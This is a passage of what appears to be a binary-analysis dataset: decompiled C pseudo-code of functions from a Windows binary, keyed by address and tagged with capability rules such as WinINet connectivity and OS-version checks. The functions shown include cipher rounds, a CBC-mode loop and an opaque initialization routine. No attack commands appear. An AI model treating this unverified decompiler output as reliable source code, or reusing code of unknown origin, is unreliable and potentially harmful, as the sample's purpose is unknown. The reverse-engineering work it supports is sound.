*((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n    uVar1 = arg_ch[8] ^ var_ch;\n    uVar1 = uVar1 << (arg_ch[9] & 0x1f) | uVar1 >> (0x20U - arg_ch[9] & 0x1f);\n    var_8h = (*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) - *((uVar1 & 0xff) * 4 + -0x4e420620)) +\n             *((uVar1 >> 0x18) * 4 + -0x4e420220) ^ *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n    uVar1 = arg_ch[10] - var_8h;\n    uVar1 = uVar1 << (arg_ch[0xb] & 0x1f) | uVar1 >> (0x20U - arg_ch[0xb] & 0x1f);\n    var_ch = (*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) + *((uVar1 & 0xff) * 4 + -0x4e420620) ^\n             *((uVar1 >> 0x18) * 4 + -0x4e420220)) - *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n    uVar1 = arg_ch[0xc] + var_ch;\n    uVar1 = uVar1 << (arg_ch[0xd] & 0x1f) | uVar1 >> (0x20U - arg_ch[0xd] & 0x1f);\n    var_8h = ((*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) ^ *((uVar1 & 0xff) * 4 + -0x4e420620)) -\n             *((uVar1 >> 0x18) * 4 + -0x4e420220)) + *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n    uVar1 = arg_ch[0xe] ^ var_8h;\n    uVar1 = uVar1 << (arg_ch[0xf] & 0x1f) | uVar1 >> (0x20U - arg_ch[0xf] & 0x1f);\n    var_ch = (*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) - *((uVar1 & 0xff) * 4 + -0x4e420620)) +\n             *((uVar1 >> 0x18) * 4 + -0x4e420220) ^ *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n    uVar1 = arg_ch[0x10] - var_ch;\n    uVar1 = uVar1 << (arg_ch[0x11] & 0x1f) | uVar1 >> (0x20U - arg_ch[0x11] & 0x1f);\n    var_8h = (*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) + *((uVar1 & 0xff) * 4 + -0x4e420620) ^\n             *((uVar1 >> 0x18) * 4 + -0x4e420220)) - *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n    uVar1 = arg_ch[0x12] + var_8h;\n    uVar1 = uVar1 << (arg_ch[0x13] & 0x1f) | uVar1 >> (0x20U - arg_ch[0x13] & 0x1f);\n    var_ch = ((*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) ^ *((uVar1 & 0xff) * 4 + -0x4e420620)) -\n             *((uVar1 >> 0x18) * 4 + -0x4e420220)) + *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n    uVar1 = arg_ch[0x14] ^ var_ch;\n    uVar1 = uVar1 << (arg_ch[0x15] & 0x1f) | uVar1 >> (0x20U - arg_ch[0x15] & 0x1f);\n    var_8h = (*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) - *((uVar1 & 0xff) * 4 + -0x4e420620)) +\n             *((uVar1 >> 0x18) * 4 + -0x4e420220) ^ *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n    uVar1 = arg_ch[0x16] - var_8h << (arg_ch[0x17] & 0x1f) | arg_ch[0x16] - var_8h >> (0x20U - arg_ch[0x17] & 0x1f);\n    var_ch = (*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) + *((uVar1 & 0xff) * 4 + -0x4e420620) ^\n             *((uVar1 >> 0x18) * 4 + -0x4e420220)) - *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n    if (arg_ch[0x20] == 0) {\n        uVar1 = arg_ch[0x18] + var_ch << (arg_ch[0x19] & 0x1f) | arg_ch[0x18] + var_ch >> (0x20U - arg_ch[0x19] & 0x1f);\n        var_8h = ((*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) ^ *((uVar1 & 0xff) * 4 + -0x4e420620)) -\n                 *((uVar1 >> 0x18) * 4 + -0x4e420220)) + *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n        uVar1 = arg_ch[0x1a] ^ var_8h;\n        uVar1 = uVar1 << (arg_ch[0x1b] & 0x1f) | uVar1 >> (0x20U - arg_ch[0x1b] & 0x1f);\n        var_ch = (*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) - *((uVar1 & 0xff) * 4 + -0x4e420620)) +\n                 *((uVar1 >> 0x18) * 4 + -0x4e420220) ^ *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n        uVar1 = arg_ch[0x1c] - var_ch;\n        uVar1 = uVar1 << (arg_ch[0x1d] & 0x1f) | uVar1 >> (0x20U - arg_ch[0x1d] & 0x1f);\n        var_8h = (*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) + *((uVar1 & 0xff) * 4 + -0x4e420620) ^\n                 *((uVar1 >> 0x18) * 4 + -0x4e420220)) - *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n        uVar1 = arg_ch[0x1e] + var_8h << (arg_ch[0x1f] & 0x1f) | arg_ch[0x1e] + var_8h >> (0x20U - arg_ch[0x1f] & 0x1f);\n        var_ch = ((*((uVar1 >> 8 & 0xff) * 4 + -0x4e420a20) ^ *((uVar1 & 0xff) * 4 + -0x4e420620)) -\n                 *((uVar1 >> 0x18) * 4 + -0x4e420220)) + *((uVar1 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n    }\n    arg_8h[1] = var_8h;\n    *arg_8h = var_ch;\n    return;\n}\n",
        "token_count": 3335
    },
    "0002fd90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002fd90(uint32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = *arg_8h;\n    var_ch = arg_8h[1];\n    if (arg_ch[0x20] == 0) {\n        uVar4 = arg_ch[0x1e] + var_ch << (arg_ch[0x1f] & 0x1f) | arg_ch[0x1e] + var_ch >> (0x20U - arg_ch[0x1f] & 0x1f);\n        var_8h = ((*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) ^ *((uVar4 & 0xff) * 4 + -0x4e420620)) -\n                 *((uVar4 >> 0x18) * 4 + -0x4e420220)) + *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n        uVar4 = arg_ch[0x1c] - var_8h;\n        uVar4 = uVar4 << (arg_ch[0x1d] & 0x1f) | uVar4 >> (0x20U - arg_ch[0x1d] & 0x1f);\n        var_ch = (*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) + *((uVar4 & 0xff) * 4 + -0x4e420620) ^\n                 *((uVar4 >> 0x18) * 4 + -0x4e420220)) - *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n        uVar4 = arg_ch[0x1a] ^ var_ch;\n        uVar4 = uVar4 << (arg_ch[0x1b] & 0x1f) | uVar4 >> (0x20U - arg_ch[0x1b] & 0x1f);\n        var_8h = (*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) - *((uVar4 & 0xff) * 4 + -0x4e420620)) +\n                 *((uVar4 >> 0x18) * 4 + -0x4e420220) ^ *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n        uVar4 = arg_ch[0x18] + var_8h << (arg_ch[0x19] & 0x1f) | arg_ch[0x18] + var_8h >> (0x20U - arg_ch[0x19] & 0x1f);\n        var_ch = ((*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) ^ *((uVar4 & 0xff) * 4 + -0x4e420620)) -\n                 *((uVar4 >> 0x18) * 4 + -0x4e420220)) + *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n    }\n    uVar4 = arg_ch[0x16] - var_ch << (arg_ch[0x17] & 0x1f) | arg_ch[0x16] - var_ch >> (0x20U - arg_ch[0x17] & 0x1f);\n    var_8h = (*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) + *((uVar4 & 0xff) * 4 + -0x4e420620) ^\n             *((uVar4 >> 0x18) * 4 + -0x4e420220)) - *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n    uVar4 = arg_ch[0x14] ^ var_8h;\n    uVar4 = uVar4 << (arg_ch[0x15] & 0x1f) | uVar4 >> (0x20U - arg_ch[0x15] & 0x1f);\n    var_ch = (*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) - *((uVar4 & 0xff) * 4 + -0x4e420620)) +\n             *((uVar4 >> 0x18) * 4 + -0x4e420220) ^ *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n    uVar4 = arg_ch[0x12] + var_ch;\n    uVar4 = uVar4 << (arg_ch[0x13] & 0x1f) | uVar4 >> (0x20U - arg_ch[0x13] & 0x1f);\n    var_8h = ((*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) ^ *((uVar4 & 0xff) * 4 + -0x4e420620)) -\n             *((uVar4 >> 0x18) * 4 + -0x4e420220)) + *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n    uVar4 = arg_ch[0x10] - var_8h;\n    uVar4 = uVar4 << (arg_ch[0x11] & 0x1f) | uVar4 >> (0x20U - arg_ch[0x11] & 0x1f);\n    var_ch = (*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) + *((uVar4 & 0xff) * 4 + -0x4e420620) ^\n             *((uVar4 >> 0x18) * 4 + -0x4e420220)) - *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n    uVar4 = arg_ch[0xe] ^ var_ch;\n    uVar4 = uVar4 << (arg_ch[0xf] & 0x1f) | uVar4 >> (0x20U - arg_ch[0xf] & 0x1f);\n    var_8h = (*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) - *((uVar4 & 0xff) * 4 + -0x4e420620)) +\n             *((uVar4 >> 0x18) * 4 + -0x4e420220) ^ *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n    uVar4 = arg_ch[0xc] + var_8h;\n    uVar4 = uVar4 << (arg_ch[0xd] & 0x1f) | uVar4 >> (0x20U - arg_ch[0xd] & 0x1f);\n    var_ch = ((*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) ^ *((uVar4 & 0xff) * 4 + -0x4e420620)) -\n             *((uVar4 >> 0x18) * 4 + -0x4e420220)) + *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n    uVar4 = arg_ch[10] - var_ch;\n    uVar4 = uVar4 << (arg_ch[0xb] & 0x1f) | uVar4 >> (0x20U - arg_ch[0xb] & 0x1f);\n    var_8h = (*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) + *((uVar4 & 0xff) * 4 + -0x4e420620) ^\n             *((uVar4 >> 0x18) * 4 + -0x4e420220)) - *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n    uVar4 = arg_ch[8] ^ var_8h;\n    uVar4 = uVar4 << (arg_ch[9] & 0x1f) | uVar4 >> (0x20U - arg_ch[9] & 0x1f);\n    var_ch = (*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) - *((uVar4 & 0xff) * 4 + -0x4e420620)) +\n             *((uVar4 >> 0x18) * 4 + -0x4e420220) ^ *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n    uVar4 = arg_ch[6] + var_ch;\n    uVar4 = uVar4 << (arg_ch[7] & 0x1f) | uVar4 >> (0x20U - arg_ch[7] & 0x1f);\n    var_8h = ((*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) ^ *((uVar4 & 0xff) * 4 + -0x4e420620)) -\n             *((uVar4 >> 0x18) * 4 + -0x4e420220)) + *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n    uVar4 = arg_ch[4] - var_8h;\n    uVar4 = uVar4 << (arg_ch[5] & 0x1f) | uVar4 >> (0x20U - arg_ch[5] & 0x1f);\n    var_ch = (*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) + *((uVar4 & 0xff) * 4 + -0x4e420620) ^\n             *((uVar4 >> 0x18) * 4 + -0x4e420220)) - *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_ch;\n    uVar4 = arg_ch[2] ^ var_ch;\n    uVar4 = uVar4 << (arg_ch[3] & 0x1f) | uVar4 >> (0x20U - arg_ch[3] & 0x1f);\n    var_8h = (*((uVar4 >> 8 & 0xff) * 4 + -0x4e420a20) - *((uVar4 & 0xff) * 4 + -0x4e420620)) +\n             *((uVar4 >> 0x18) * 4 + -0x4e420220) ^ *((uVar4 >> 0x10 & 0xff) * 4 + -0x4e41fe20) ^ var_8h;\n    uVar4 = *arg_ch + var_8h;\n    uVar5 = uVar4 << (arg_ch[1] & 0x1f) | uVar4 >> (0x20U - arg_ch[1] & 0x1f);\n    uVar4 = *((uVar5 >> 8 & 0xff) * 4 + -0x4e420a20);\n    uVar1 = *((uVar5 & 0xff) * 4 + -0x4e420620);\n    iVar2 = *((uVar5 >> 0x18) * 4 + -0x4e420220);\n    iVar3 = *((uVar5 >> 0x10 & 0xff) * 4 + -0x4e41fe20);\n    arg_8h[1] = var_8h;\n    *arg_8h = ((uVar4 ^ uVar1) - iVar2) + iVar3 ^ var_ch;\n    return;\n}\n",
        "token_count": 3399
    },
    "000307e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Switch with 1 destination removed at 0x00030ac6\n// WARNING: Switch with 1 destination removed at 0x000310e3\n\nvoid __cdecl\nfcn.000307e0(uint8_t *arg_8h, uchar *arg_ch, int32_t arg_10h, uint arg_14h, uint8_t *arg_18h, int32_t arg_1ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if (arg_1ch == 0) {\n        var_1ch = arg_18h[7] | arg_18h[6] << 8 | arg_18h[5] << 0x10 | arg_18h[4] << 0x18;\n        var_4h = arg_18h[3] | arg_18h[2] << 8 | arg_18h[1] << 0x10 | *arg_18h << 0x18;\n        for (var_24h = arg_10h + -8; -1 < var_24h; var_24h = var_24h + -8) {\n            uVar9 = arg_8h[3] | arg_8h[2] << 8 | arg_8h[1] << 0x10 | *arg_8h << 0x18;\n            uVar10 = arg_8h[7] | arg_8h[6] << 8 | arg_8h[5] << 0x10 | arg_8h[4] << 0x18;\n            arg_8h = arg_8h + 8;\n            var_14h = uVar9;\n            var_10h = uVar10;\n            fcn.0002fd90(&var_14h, arg_14h);\n            var_ch = var_14h ^ var_4h;\n            var_8h = var_10h ^ var_1ch;\n            *arg_ch = var_ch >> 0x18;\n            arg_ch[1] = var_ch >> 0x10;\n            arg_ch[2] = var_ch >> 8;\n            arg_ch[3] = var_ch;\n            arg_ch[4] = var_8h >> 0x18;\n            arg_ch[5] = var_8h >> 0x10;\n            arg_ch[6] = var_8h >> 8;\n            arg_ch[7] = var_8h;\n            arg_ch = arg_ch + 8;\n            var_1ch = uVar10;\n            var_4h = uVar9;\n        }\n        if (var_24h != -8) {\n            uVar9 = arg_8h[3] | arg_8h[2] << 8 | arg_8h[1] << 0x10 | *arg_8h << 0x18;\n            var_1ch = arg_8h[7] | arg_8h[6] << 8 | arg_8h[5] << 0x10 | arg_8h[4] << 0x18;\n            var_14h = uVar9;\n            var_10h = var_1ch;\n            fcn.0002fd90(&var_14h, arg_14h);\n            var_4h = uVar9;\n            if (var_24h + 7U < 8) {\n                return;\n            }\n        }\n        *arg_18h = var_4h >> 0x18;\n        arg_18h[1] = var_4h >> 0x10;\n        arg_18h[2] = var_4h >> 8;\n        arg_18h[3] = var_4h;\n        arg_18h[4] = var_1ch >> 0x18;\n        arg_18h[5] = var_1ch >> 0x10;\n        arg_18h[6] = var_1ch >> 8;\n        arg_18h[7] = var_1ch;\n    }\n    else {\n        var_ch = arg_18h[3] | arg_18h[2] << 8 | arg_18h[1] << 0x10 | *arg_18h << 0x18;\n        var_8h = arg_18h[7] | arg_18h[6] << 8 | arg_18h[5] << 0x10 | arg_18h[4] << 0x18;\n        for (var_24h = arg_10h + -8; -1 < var_24h; var_24h = var_24h + -8) {\n            uVar1 = *arg_8h;\n            puVar2 = arg_8h + 1;\n            puVar3 = arg_8h + 2;\n            puVar4 = arg_8h + 3;\n            puVar5 = arg_8h + 4;\n            puVar6 = arg_8h + 5;\n            puVar7 = arg_8h + 6;\n            puVar8 = arg_8h + 7;\n            arg_8h = arg_8h + 8;\n            var_14h = (*puVar4 | *puVar3 << 8 | *puVar2 << 0x10 | uVar1 << 0x18) ^ var_ch;\n            var_10h = (*puVar8 | *puVar7 << 8 | *puVar6 << 0x10 | *puVar5 << 0x18) ^ var_8h;\n            fcn.0002f350(&var_14h, arg_14h);\n            var_ch = var_14h;\n            var_8h = var_10h;\n            *arg_ch = var_14h >> 0x18;\n            arg_ch[1] = var_14h >> 0x10;\n            arg_ch[2] = var_14h >> 8;\n            arg_ch[3] = var_14h;\n            arg_ch[4] = var_10h >> 0x18;\n            arg_ch[5] = var_10h >> 0x10;\n            arg_ch[6] = var_10h >> 8;\n            arg_ch[7] = var_10h;\n            arg_ch = arg_ch + 8;\n        }\n        if (var_24h != -8) {\n            if (var_24h + 7U < 8) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            var_14h = var_ch;\n            var_10h = var_8h;\n            fcn.0002f350(&var_14h, arg_14h);\n            var_ch = var_14h;\n            var_8h = var_10h;\n            *arg_ch = var_14h >> 0x18;\n            arg_ch[1] = var_14h >> 0x10;\n            arg_ch[2] = var_14h >> 8;\n            arg_ch[3] = var_14h;\n            arg_ch[4] = var_10h >> 0x18;\n            arg_ch[5] = var_10h >> 0x10;\n            arg_ch[6] = var_10h >> 8;\n            arg_ch[7] = var_10h;\n        }\n        *arg_18h = var_ch >> 0x18;\n        arg_18h[1] = var_ch >> 0x10;\n        arg_18h[2] = var_ch >> 8;\n        arg_18h[3] = var_ch;\n        arg_18h[4] = var_8h >> 0x18;\n        arg_18h[5] = var_8h >> 0x10;\n        arg_18h[6] = var_8h >> 8;\n        arg_18h[7] = var_8h;\n    }\n    return;\n}\n",
        "token_count": 1986
    },
    "00032230": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00032230(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t extraout_EDX;\n    uint *puVar2;\n    uint *noname_0;\n    int32_t var_ddh;\n    uint var_d8h;\n    uint var_d4h;\n    uint *var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint32_t var_b8h;\n    uint *var_b4h;\n    uint var_b0h;\n    uint var_a8h;\n    \n    if (*0xb1c5b345 == '\\0') {\n        if (*0xb1c5b0a4 == 0) {\n            *NULL = -0x3fffffff;\n        }\n        else {\n            fcn.00032220(0xb1c5b384);\n            (**0xb1bde0cc)(0xb1c5b3a8, 1, 0);\n            fcn.00032200(0xb1c5b3a0);\n            noname_0 = extraout_EDX & 0xffffff00 | arg_8h & 0xff;\n            *NULL = fcn.000339e0(noname_0, &var_ddh);\n            if (*NULL == 0) {\n                fcn.0002bd30(&var_a8h, 0x52);\n                fcn.00078550(&var_c0h, &var_a8h);\n                iVar1 = *0xb1c5b0a4;\n                *NULL = (**0xb1bde198)(*0xb1c5b0a4, 0, &var_c0h, 7, 1, 0, 0xb1c5b398);\n                if ((*NULL == 0) && (noname_0 = *0xb1c5b398,  *NULL = fcn.00033970(*0xb1c5b398),  *NULL == 0)) {\n                    (*0xb1c5b398)[7] = (*0xb1c5b398)[7] | 0x10;\n                    (*0xb1c5b398)[7] = (*0xb1c5b398)[7] & 0xffffff7f;\n                    noname_0 = *0xb1c5b398;\n                    *NULL = fcn.00016090(*0xb1c5b398, 0xb1bff7c0, 0);\n                    if (*NULL == 0) {\n                        var_d8h = 0x18;\n                        var_d4h = 0;\n                        var_cch = 0;\n                        var_d0h = NULL;\n                        var_c8h = 0;\n                        var_c4h = 0;\n                        *0xb1c5b390 = 0x1000000;\n                        *0xb1c5b394 = 0;\n                        noname_0 = 0xb1c5b378;\n                        *NULL = fcn.0007868e(iVar1, 6, &var_d8h, 0xb1c5b390, 4, 0x18000000, 0);\n                        if (*NULL == 0) {\n                            var_b8h = *0xb1c5b390;\n                            noname_0 = *0xb1c5b378;\n                            *NULL = fcn.0007867c();\n                            if (*NULL == 0) {\n                                *0xb1c5b390 = var_b8h;\n                                *0xb1c5b394 = 0;\n                                fcn.0002bd60(&var_a8h, 0x52);\n                                puVar2 = &var_a8h;\n                                fcn.00078550(&var_c0h, puVar2);\n                                *NULL = (**0xb1bde198)(*0xb1c5b0a4, 0, &var_c0h, 7, 1, 0, 0xb1c5b39c);\n                                if ((*NULL == 0) &&\n                                   (noname_0 = *0xb1c5b39c,  *NULL = fcn.00033970(*0xb1c5b39c),  *NULL == 0)) {\n                                    (*0xb1c5b39c)[7] = (*0xb1c5b39c)[7] | 0x10;\n                                    (*0xb1c5b39c)[7] = (*0xb1c5b39c)[7] & 0xffffff7f;\n                                    noname_0 = *0xb1c5b39c;\n                                    *NULL = fcn.00016090(*0xb1c5b39c, 0xb1bff7c0, 0);\n                                    if (*NULL == 0) {\n                                        fcn.00033cc0(1, *0xb1c5b390, 2, *0xb1c5b390 >> 0xf, 0x20, 0x200);\n                                        *0xb1c5b346 = 0;\n                                        noname_0 = 0xb1c5b3b8;\n                                        *NULL = fcn.0001a8e0(0xb1c5b3b8, 0xb1c00500, 0);\n                                        if (*NULL == 0) {\n                                            *0xb1c5b345 = '\\x01';\n                                            if (var_ddh == '\\0') {\n                                                fcn.0002bd30(&var_a8h, 0x52);\n                                                fcn.00078550(&var_c0h, &var_a8h);\n                                                var_d8h = 0x18;\n                                                var_d4h = 0;\n                                                var_cch = 0x40;\n                                                var_d0h = &var_c0h;\n                                                var_c8h = 0;\n                                                var_c4h = 0;\n                                                noname_0 = &var_b4h;\n                                                iVar1 = fcn.0007856e(puVar2, 0x80000000, &var_d8h, &var_b0h, 7, 0);\n                                                if (iVar1 == 0) {\n                                                    fcn.00078544();\n                                                    noname_0 = var_b4h;\n                                                }\n                                                else {\n                                                    var_ddh._0_1_ = '\\x01';\n                                                }\n                                            }\n                                            if (var_ddh != '\\0') {\n                                                noname_0 = NULL;\n                                                fcn.00033cc0(0, *0xb1c5b388, 2, *0xb1c5b388 >> 0xf, 0x20, 0x200);\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n            if (stack0xffffff20 != 0) {\n                if (*0xb1c5b398 != NULL) {\n                    (**0xb1bde174)(*0xb1c5b398, noname_0);\n                    fcn.00016110(*0xb1c5b398);\n                    *0xb1c5b398 = NULL;\n                }\n                if (*0xb1c5b39c != NULL) {\n                    (**0xb1bde174)(*0xb1c5b39c);\n                    fcn.00016110(*0xb1c5b39c);\n                    *0xb1c5b39c = NULL;\n                }\n                if (*0xb1c5b380 != 0) {\n                    fcn.00078688(0xffffffff, *0xb1c5b380);\n                    *0xb1c5b380 = 0;\n                }\n                if (*0xb1c5b378 != NULL) {\n                    fcn.00078544(*0xb1c5b378);\n                    *0xb1c5b378 = NULL;\n                }\n            }\n        }\n    }\n    else {\n        *NULL = 0;\n    }\n    return *NULL;\n}\n",
        "token_count": 1780
    },
    "00032e00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00032e00(int32_t *arg_8h)\n\n{\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    do {\n        if (1 < var_8h) {\n            return 0;\n        }\n        if (((*(var_8h * 4 + -0x4e3a4c68) != 0) && (*(*(var_8h * 4 + -0x4e3a4c68) + 0x24) != 0)) &&\n           (*(*(*(var_8h * 4 + -0x4e3a4c68) + 0x24) + 8) != 0)) {\n            for (var_4h = *(*(*(var_8h * 4 + -0x4e3a4c68) + 0x24) + 8); *(var_4h + 0x10) != 0; var_4h = *(var_4h + 0x10)\n                ) {\n                if (*arg_8h == *(var_4h + 0x10)) {\n                    *arg_8h = var_4h;\n                    return 1;\n                }\n            }\n        }\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 305
    },
    "00032ea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00032ea0(int32_t *param_1, char param_2, uint *param_3, uint *param_4)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint16_t uVar5;\n    uint32_t *in_FS_OFFSET;\n    uint var_18h;\n    int32_t *var_8h;\n    uint var_ch;\n    uint *var_10h_2;\n    uint *var_14h;\n    uint var_94h;\n    uint var_8ch;\n    uint *var_88h;\n    uint var_82h;\n    uint var_78h;\n    uint *var_74h;\n    uint var_70h;\n    uint var_68h;\n    uint *var_64h;\n    uint var_60h;\n    uint var_58h;\n    uint *var_54h;\n    uint var_50h;\n    uint var_48h;\n    uint *var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_19h;\n    uint32_t var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0xb1c45890;\n    uStack16 = 0xb1c4578a;\n    uVar2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    var_28h = 0;\n    var_34h = NULL;\n    var_19h._0_1_ = 0;\n    var_10h = uVar2;\n    if (*0xb1c5b3c0 == NULL) {\n        *0xb1c5b3c0 = fcn.00035200(0xa28);\n        if (*0xb1c5b3c0 == NULL) {\n            uVar2 = 0;\n            goto code_r0x000334c5;\n        }\n        *0xb1c59f5c = *0xb1c5b3c0 + 0x82;\n        *0xb1c59f50 = *0xb1c5b3c0 + 0x104;\n        *0xb1c59f3c = *0xb1c5b3c0 + 0x186;\n        